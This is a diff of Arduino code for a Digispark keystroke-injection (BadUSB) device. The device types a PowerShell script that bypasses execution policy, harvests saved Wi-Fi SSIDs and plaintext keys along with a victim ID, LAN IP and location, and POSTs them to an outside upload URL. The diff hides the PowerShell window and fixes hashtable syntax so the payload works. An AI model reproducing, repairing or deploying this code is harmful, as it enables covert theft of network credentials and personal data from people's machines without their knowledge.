@@ -15,10 +15,10 @@ void loop() {
   DigiKeyboard.delay(600);
 
   // Launch PowerShell (visible)
-  DigiKeyboard.println("powershell -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass");
+  DigiKeyboard.println("powershell -NoLogo -NoProfile -ExecutionPolicy Bypass");
   DigiKeyboard.delay(1800);
 
-  // Wi‑Fi grab + victim ID + LAN IP + location + CSV + POST + cleanup + exit
+  // Wi-Fi grab + victim ID + LAN IP + location + CSV + POST + cleanup + exit
   DigiKeyboard.print(
     F(
       "$u='https://narain.udhees.com/upload.php?token=Narain';"
@@ -37,7 +37,7 @@ void loop() {
         "$x=[xml](Get-Content $_.FullName);"
         "$s=$x.WLANProfile.SSIDConfig.SSID.name;"
         "$p=$x.WLANProfile.MSM.security.sharedKey.keyMaterial;"
-        "$items+=[pscustomobject]{"
+        "$items+=[pscustomobject]@{"
           "Time=$ts;"
           "VictimID=$victimId;"
           "SSID=$s;"
